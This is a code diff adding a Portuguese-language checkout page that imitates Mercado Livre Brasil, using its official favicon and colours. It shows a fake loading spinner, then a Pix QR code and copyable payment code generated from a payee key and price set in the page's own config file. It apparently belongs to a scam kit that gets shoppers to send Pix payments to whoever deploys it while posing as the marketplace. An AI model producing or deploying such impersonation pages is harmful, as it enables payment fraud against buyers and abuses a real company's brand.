@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#26B46A">
+    <title>Mercado Livre Brasil</title>
+    <link rel="icon" href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/5.21.22/mercadolibre/favicon.svg" type="image/png">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+    <style>
+        body {
+            background-color: #f5f5f5;
+        }
+
+        .header-content {
+            background-color: #26B46A;
+            padding: 60px 0;
+            text-align: center;
+            color: #fff;
+        }
+
+        .header-content .icon-container {
+            width: 60px;
+            height: 60px;
+            background-color: #f0f0f0;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 20px;
+        }
+
+        .header-content .icon-container i {
+            font-size: 30px;
+            color: #26B46A;
+        }
+
+        .header-content h3 {
+            margin-bottom: 10px;
+        }
+
+        .main-content {
+            background-color: #fff;
+            max-width: 400px;
+            margin: -50px auto 0;
+            padding: 30px;
+            border: 1px solid rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.05);
+            text-align: center;
+        }
+
+        .qrcode-container img {
+            width: 180px;
+            height: auto;
+            margin: 10px 0;
+        }
+
+        .info-section {
+            margin-bottom: 20px;
+        }
+
+        .info-text {
+            font-size: 17px;
+        }
+
+        .pix-code-section {
+            margin-top: 10px;
+        }
+
+        .pix-code-box {
+            background-color: #e9e9e9;
+            color: #5e5e5e;
+            padding: 10px 12px;
+            border-radius: 4px;
+            font-size: 15px;
+        }
+
+        .btn-copy, .btn-copy:focus {
+            background-color: #3483fa;
+            color: #ffffff;
+            font-size: 15px;
+            font-weight: 600;
+            border-radius: 4px;
+            box-shadow: none;
+            padding: 10px;
+            width: 100%;
+        }
+
+        .btn-copy:hover {
+            background-color: #3079e7;
+            color: #ffffff;
+        }
+
+        .loading-content {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #ffffff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .spinner-border {
+            color: #3483fa;
+            width: 3rem;
+            height: 3rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-content text-center">
+        <div class="spinner-border"></div>
+    </div>
+    <header class="header-content" style="display:none;">
+        <div class="icon-container">
+            <i class="bi bi-bag-check-fill"></i>
+        </div>
+        <h3>Já é quase seu!</h3>
+        <p>Realize o pagamento via Pix</p>
+    </header>
+    <main class="main-content pb-5" style="display:none;">
+        <div class="qrcode-container">
+            <img class="qrcode-img" alt="qrcode">
+        </div>
+        <div class="info-section">
+            <p class="mb-0">Escaneie o QRCode ou copie o código abaixo!</p>
+            <small class="text-muted">Você receberá uma confirmação no e-mail.</small>
+        </div>
+        <div class="pix-code-section">
+            <div class="pix-code-box"></div>
+            <button class="btn btn-copy mt-3">Copiar Código</button>
+        </div>
+    </main>
+    <script src="https://code.jquery.com/jquery-3.7.1.js" integrity="sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/qrcodejs/qrcode.min.js"></script>
+    <script src="config.js"></script>
+    <script src="pix.js"></script>
+    <script>
+        $(document).ready(function() {
+            // pix/qrcode
+            const api_pix = new Pix(pix.chave, pix.descricao, pix.instituicao, pix.cidade, "192837", parseFloat(produto.preco.desconto.replace(",", ".")));
+            const pix_code = api_pix.getPayload();
+            const temp_qrcode = document.createElement("div");
+
+            new QRCode(temp_qrcode, {
+                text: pix_code,
+                width: 200,
+                height: 200,
+                correctLevel: QRCode.CorrectLevel.L
+            });
+            
+            $(".pix-code-box").text(pix_code.substring(0, 35));
+            $(".qrcode-img").attr("src", temp_qrcode.querySelector("canvas").toDataURL());
+            
+            // copy event
+            $(".btn-copy").click(function() {
+                let temp_copy = $("<input>");
+                $("body").append(temp_copy);
+                temp_copy.val(pix_code).select();
+                document.execCommand("copy");
+                temp_copy.remove();
+
+                $(this).text("Copiado");
+
+                setTimeout(() => {
+                    $(this).text("Copiar Código");
+                }, 5000);
+            });
+
+            // loading
+            setTimeout(function(){
+                $(".loading-content").fadeOut(2000, function() {
+                    $(".header-content").fadeIn(2000);
+                    $(".main-content").fadeIn(2000);
+                });
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
